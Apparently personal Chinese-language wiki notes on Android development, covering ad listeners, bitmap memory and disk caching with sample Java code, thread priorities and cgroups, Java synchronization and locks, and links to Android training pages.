    mAdView.setAdListener(new MyAdListener());
    AdRequest adRequest = new AdRequest();
    adRequest.addKeyword("sporting goods");
    mAdView.loadAd(adRequest);
    return v;
}
```
# 使用 调试模式
# 实现 Ad Event Listeners
如果可能，你应该考虑实现各种ad event listener。比如，如果加载广告失败了，可以显示一个预先定义的广告条
示例为AdMob的listener
```java
private class MyAdListener implements AdListener {
    ...
    @Override
    public void onFailedToReceiveAd(Ad ad, ErrorCode errorCode) {
        mAdStatus.setText(R.string.error_receive_ad);
    }
    @Override
    public void onReceiveAd(Ad ad) {
        mAdStatus.setText("");
    }
}
```
# 参考
 * http://developer.android.com/training/monetization/ads-and-ux.html
# Android Beam
# 参考
 * http://developer.android.com/resources/samples/AndroidBeamDemo/index.html
# Capturing Photos
# 参考
 * http://developer.android.com/training/camera/index.html
# Creating Backward-Compatible UIs
# 参考
 * http://developer.android.com/training/backward-compatible-ui/index.html
# Designing Effective Navigation
# 参考
  * http://developer.android.com/training/design-navigation/index.html
# Displaying Bitmaps Efficiently
Bitmap对象可以很大，如果在使用过程中不加注意，很容易耗尽应用的内存:
```
java.lang.OutofMemoryError: bitmap size exceeds VM budget.
```
 * 移动终端设备受到系统资源的限制，分配给应用的内存可能小到只有16M. Android Compatibility Definition Document 3.7节 Virtual Machine Compatibility 有一张
屏幕尺寸与最小应用内存的对照表.
 * Bitmaps对象到底有多大呢？ 一张2592x1936(500万像素)的照片， 以ARGB_8888的方式加载为Bitmap对象，大小约为2582x1936x4=19995008字节，接近20MB
 * Android很多UI控件需要加载多个位图，诸如ListView, GridView, ViewPager等等， 处理不好很容易带来极差的用户体验.
# 如何高效的加载大位图
# 别在UI线程处理位图
# 缓存
假如你使用ListView展示多个图片， 凡是屏幕上能够看到的，肯定已经加载到内存中了， 显示区域之外的图片， 由系统组件进行回收，所以，一切正常的话内存是不会被耗尽的。但随之而来的问题是，如果每次显示图像的时候再去加载，
势必会造成UI的不流畅。 为了解决这个问题，需要使用MemoryCache和DiskCache.
# LruCache
LruCache将最近使用的对象通过强引用的方式缓存起来，使得GC无法回收被缓存对象， 如果缓存超过指定大小， 按照Lru(Least Recently Used)算法将部分缓存对象清除，同时又保证了缓存的命中率。 问题是:
 1. 多大缓存合适呢?
 2. 屏幕上最多能放多少图像？ 又有多少图像需要在缓存中严阵以待？
 3. 屏幕的尺寸以及密度会对缓存大小有何影响? (同等条件下，xhdpi比hdpi需要更大的缓存)
 4. 位图的Dimensions和配置对Bitmap对象的大小有什么影响?
 5. 缓存中数据访问频率究竟怎样？是不是一些数据比其他数据更频繁的被访问？是不是应当将一些数据持续缓存起来，而不是放到LruCache中？是不是可以将数据分组，保存在不同的LruCache中?
 6. 是缓存多个数量小而质量差的图片？还是缓存少量质量好的图片？怎么平衡数量和质量?
 
以上这些因素都要根据应用的情况具体分析.
```java
private LruCache mMemoryCache;
@Override
protected void onCreate(Bundle savedInstanceState) {
    ...
    // Get memory class of this device, exceeding this amount will throw an
    // OutOfMemory exception.
    final int memClass = ((ActivityManager) context.getSystemService(
            Context.ACTIVITY_SERVICE)).getMemoryClass();
    // Use 1/8th of the available memory for this memory cache.
    final int cacheSize = 1024 * 1024 * memClass / 8;
    mMemoryCache = new LruCache(cacheSize) {
        @Override
        protected int sizeOf(String key, Bitmap bitmap) {
            // The cache size will be measured in bytes rather than number of items.
            return bitmap.getByteCount();
        }
    };
    ...
}
public void addBitmapToMemoryCache(String key, Bitmap bitmap) {
    if (getBitmapFromMemCache(key) == null) {
        mMemoryCache.put(key, bitmap);
    }
}
public Bitmap getBitmapFromMemCache(String key) {
    return mMemoryCache.get(key);
}
```
```div class=note
此例中:
 * 在hdpi设备上，缓存大小约为(32/8=4M). 
 * 全屏(800x480)的GridView大约需要1.5M内存(800x480x4)
 * 4M缓存大约能够存储4/1.5=2.5页图像
```
加载图片时， 需要先从LruCache中查找
```java
public void loadBitmap(int resId, ImageView imageView) {
    final String imageKey = String.valueOf(resId);
    final Bitmap bitmap = getBitmapFromMemCache(imageKey);
    if (bitmap != null) {
        mImageView.setImageBitmap(bitmap);
    } else {
        mImageView.setImageResource(R.drawable.image_placeholder);
        BitmapWorkerTask task = new BitmapWorkerTask(mImageView);
        task.execute(resId);
    }
}
```
BitmapWorkerTask:
```java
class BitmapWorkerTask extends AsyncTask {
    ...
    // Decode image in background.
    @Override
    protected Bitmap doInBackground(Integer... params) {
        final Bitmap bitmap = decodeSampledBitmapFromResource(getResources(), params[0], 100, 100));
        addBitmapToMemoryCache(String.valueOf(params[0]), bitmap);
        return bitmap;
    }
    ...
}
```
# 使用!DiskCache
```java
private DiskLruCache mDiskCache;
private static final int DISK_CACHE_SIZE = 1024 * 1024 * 10; // 10MB
private static final String DISK_CACHE_SUBDIR = "thumbnails";
@Override
protected void onCreate(Bundle savedInstanceState) {
    ...
    // Initialize memory cache
    ...
    File cacheDir = getCacheDir(this, DISK_CACHE_SUBDIR);
    mDiskCache = DiskLruCache.openCache(this, cacheDir, DISK_CACHE_SIZE);
    ...
}
class BitmapWorkerTask extends AsyncTask {
    ...
    // Decode image in background.
    @Override
    protected Bitmap doInBackground(Integer... params) {
        final String imageKey = String.valueOf(params[0]);
        // Check disk cache in background thread
        Bitmap bitmap = getBitmapFromDiskCache(imageKey);
        if (bitmap == null) { // Not found in disk cache
            // Process as normal
            final Bitmap bitmap = decodeSampledBitmapFromResource(
                    getResources(), params[0], 100, 100));
        }
        // Add final bitmap to caches
        addBitmapToCache(String.valueOf(imageKey, bitmap);
        return bitmap;
    }
    ...
}
public void addBitmapToCache(String key, Bitmap bitmap) {
    // Add to memory cache as before
    if (getBitmapFromMemCache(key) == null) {
        mMemoryCache.put(key, bitmap);
    }
    // Also add to disk cache
    if (!mDiskCache.containsKey(key)) {
        mDiskCache.put(key, bitmap);
    }
}
public Bitmap getBitmapFromDiskCache(String key) {
    return mDiskCache.get(key);
}
// Creates a unique subdirectory of the designated app cache directory. Tries to use external
// but if not mounted, falls back on internal storage.
public static File getCacheDir(Context context, String uniqueName) {
    // Check if media is mounted or storage is built-in, if so, try and use external cache dir
    // otherwise use internal cache dir
    final String cachePath = Environment.getExternalStorageState() == Environment.MEDIA_MOUNTED
            || !Environment.isExternalStorageRemovable() ?
                    context.getExternalCacheDir().getPath() : context.getCacheDir().getPath();
    return new File(cachePath + File.separator + uniqueName);
}
```
# 处理Configuration Changes
# 显示
# 参考
 * http://developer.android.com/training/displaying-bitmaps/index.html
 * [http://source.android.com/compatibility/downloads.html CDD]
# Improving Layout Performance
# 参考
 * http://developer.android.com/training/improving-layouts/index.html
# Layout Tricks
# 参考
 * http://developer.android.com/resources/articles/layout-tricks-efficiency.html
 * http://developer.android.com/resources/articles/layout-tricks-stubs.html
 * http://developer.android.com/resources/articles/layout-tricks-merge.html
 * http://developer.android.com/resources/articles/window-bg-speed.html
# Maintaining Multiple APKs
# 参考
 * http://developer.android.com/training/multiple-apks/index.html
# Monetizing Your App
# 参考
 * http://developer.android.com/training/monetization/index.html
# Optimizing Battery Life
# 参考
 * http://developer.android.com/training/monitoring-device-state/index.html
# Sharing Content
# 参考
 * http://developer.android.com/training/sharing/index.html
# API 4+ Support 
# 参考
 * http://developer.android.com/resources/samples/Support4Demos/index.html
# Text To Speech Engine
 
# 参考
 * http://developer.android.com/resources/samples/TtsEngine/index.html
 * http://developer.android.com/resources/articles/tts.html
# Tracking Memory Allocations
# 参考
 * http://developer.android.com/resources/articles/track-mem.html
# Transferring Data Without Draining the Battery
# 参考
 * http://developer.android.com/training/efficient-downloads/index.html
# Using the Support Library
# 参考
 * http://developer.android.com/training/basics/fragments/support-lib.html
# WiFiDirect
# 参考
 * http://developer.android.com/resources/samples/WiFiDirectDemo/index.html
# Android Unit Test =
# Monkey 入门 =
返回:[[ParentWiki]]
# UniversalImageLoader
```sh
$ git clone https://github.com/nostra13/Android-Universal-Image-Loader
```
# Android UT =
[[TOC]]
==资源优化
 * [https://github.com/tjko/jpegoptim jpegoptim]
 * [http://optipng.sourceforge.net/ optipng]
# 参考
 * http://optipng.sourceforge.net/pngtech/optipng.html
 * http://blog.grayghostvisuals.com/workflow/jpegoptim-optipng-intro/
[[TOC]]
# Linux Thread Schduling
Linux线程的调度受两个东西的影响
 1. 优先级
 2. 控制组(cgroup/ControlGroup)
# 优先级
Java提供一个API可以修改优先级:
```
java.lang.Thread
    setPriority(int priority);
```
  * priority : 0-10 (值越大,优先级越高, 跟linux的nice正好相反)
Android也提供两个API:
```
android.os.Process
    Process.setThreadPriority(int priority);               
    Process.setThreadPriority(int threadId, int priority);
```
对应关系:
|| Linux Niceness || Java Priority ||
|| -8|| 10 (Thread.MAX_PRIORITY) ||
|| -7||                          ||
|| -6||  9                       ||
|| -5||  8                       ||
|| -4||  7                       ||
|| -3||                          ||
|| -2||  6
|| -1||
||  0||  5 (Thread.NORMAL_PRIORITY)
||  1||
||  2||
||  3||
||  4||
||  5||
||  6||
||  7||
||  9||
|| 10|| 4
|| 11||
|| 12||
|| 13|| 3
|| 14||
|| 15||
|| 16|| 2
|| 17||
|| 18||
|| 19|| 1 (Thread.MIN_PRIORITY)
# cgroup
Linux的cgroup用来控制CPU/内存资源的分配, 每个线程都属于某个cgroup.
Android定义了几个CGROUP, 其中比较重要的是ForegroundGroup和BackgroundGroup, 比如
```
# app a.m.a.s.demo 出于可见状态的时候
$ adb shell ps -P | grep a.m.a.s.demo
u0_a67    7348  1700  554272 56436 fg  ffffffff 00000000 S a.m.a.s.demo
# 当按Home键回到桌面后
$ adb shell ps -P | grep a.m.a.s.demo
u0_a67    7348  1700  544272 56436 bg  ffffffff 00000000 S a.m.a.s.demo
```
# Java线程间通信
# Java Pipe
 * PipeReader
 * PipeWriter
# SharedMemory(Heap)
这个比较直观, 多个线程之间可以共享同一个进程的数据.
# Signal
线程之间通过锁可以协作工作, 实际上也是隐含了一种通信方式. 这些都是依靠线程信号来通信的. 线程信号实在是太底层了,而且容易出错.因此实践中不会使用.
# Blocking Queue
多线程协同工作的常见模型就是生产者和消费者, BlockingQueue作为生产者和消费者通讯的渠道. 可以简化线程之间的通讯.
# Java Lock
# Intrinsic Lock 
synchronized基于这个, 每个对象实例都有Intrinsic Lock?
# Java Monitor
Intrinsic lock 是 Java的monitor, monitor 有三种状态:
 * BLOCKED
 * EXCUTING
 * WATING
```
什么是monitor, monitor是一种同步机制, 可以保证任一时间内, 只有一个线程可以执行临界区中的代码.
```
当一段代码被IntrinsicLock所保护的时候, 这段代码就在临界区内.
synchronized (this) {  // (1) Enter Monitor 
                       // (2) Acquire Lock
wait();                // (3) Release Lock & Wait
                       // (4) Acquire Lock After Signal (notify() /  notifyAll())
}                      // (5) Release Lock & Exit Monitor
# synchronized
# Method Level
```
synchronized void changeState() {
sharedResource++;
}
```
  * 可以保证整个方法都在Monitor中, 使用Object的内置锁, 粒度大, 使用简单.
# Block Level
```
void changeState() {
    synchronized(this) {
        sharedResource++;
    }
}
```
 * 可以保证指定区域在Monitor中, 使用Object的内置锁, 粒度可以控制, 只对必要的代码进行保护, 可以降低锁开销.
# Block Level With Other Object's IntrinsicLock
```
private final Object mLock = new Object();
void changeState() {
        synchronized(mLock) {
        sharedResource++;
    }
}
```
 * 使用另外一个对象的内置锁, 可以避免共用同一个对象的内置锁所产生的开销
# Method Level with Class's IntrinsicLock
```
synchronized static void changeState() {
    staticSharedResource++;
}
```
# Block Level with Class's IntrinsicLock
```
static void changeState() {
    synchronized(this.getClass()) {
    staticSharedResource++;
    }
}
```
通过以上几种方法, 开发者可以控制锁的粒度, 从而降低同步开销. 
# ReentrantLock 
ReentrantLock 和 synchronized 在语意级别上是等价的, 都是用于建立临界区, 保证任一时刻只有一个线程执行临界区中的代码.
# ReentrantReadWriteLock
ReentrantLock & synchronized 有时候会过分保护临界区的代码, 比如, 多个进程读取临界区中的状态但是没有写操作发生就是无害的. 
因此 ReentrantReadWriteLock 用来解决这种问题. 但是这个机制的实现太复杂了, 进入临界区比起ReentrantLock要增加很多计算开销, 
所以最好只在大量读线程, 而只有少量线程写, 并且你还是十分在意读性能的情况下才使用它.
# Android ps command
```
-t Shows thread information in the processes.
-x Shows time spent in user code (utime) and system code (stime) in “jiffies,” which typically is units of 10 ms.
-p Shows priorities.
-P Shows scheduling policy, normally indicating whether the application is executing in the foreground or background.
-c Shows which CPU is executing the process.
name|pid Filter on the application’s name or process ID. Only the last defined value is used.
```

